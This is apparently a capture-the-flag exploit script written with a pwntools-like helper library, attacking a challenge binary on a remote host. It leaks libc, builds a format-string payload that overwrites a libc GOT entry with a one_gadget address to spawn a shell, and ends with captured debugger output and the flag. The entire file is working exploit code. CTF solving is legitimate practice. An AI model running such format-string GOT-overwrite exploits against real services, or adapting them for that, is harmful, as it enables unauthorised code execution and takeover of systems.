#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit.basic import *
from time import sleep

exe = context.binary = ELF("./chall")
host = args.HOST or "35.222.8.29"
port = int(args.PORT or 7001)

gdbscript = """
b *0x5555555553bf
""".format(
    **locals()
)

libc = SetupLibcELF()
io = start()
libc.address = GetInt()[0] - libc.sym["system"]
write_addr = libc.address + 0x2190B8
lb()
print(hex(libc.sym.system))
payload = fmtstr_payload(
    6, {write_addr: libc.address + 0xEBCF1}, write_size="byte"
).ljust(228, b"A")
sl(payload)
io.interactive()
"""
17:00b8│  0x7ffff7fac0b8 (*ABS*@got.plt) ◂— 0x7fffdeadb016
BSM{d0n7_m355_up_w17h_4_80y_wh0_d1d_p14n0_4nd_c4111924phy}
"""
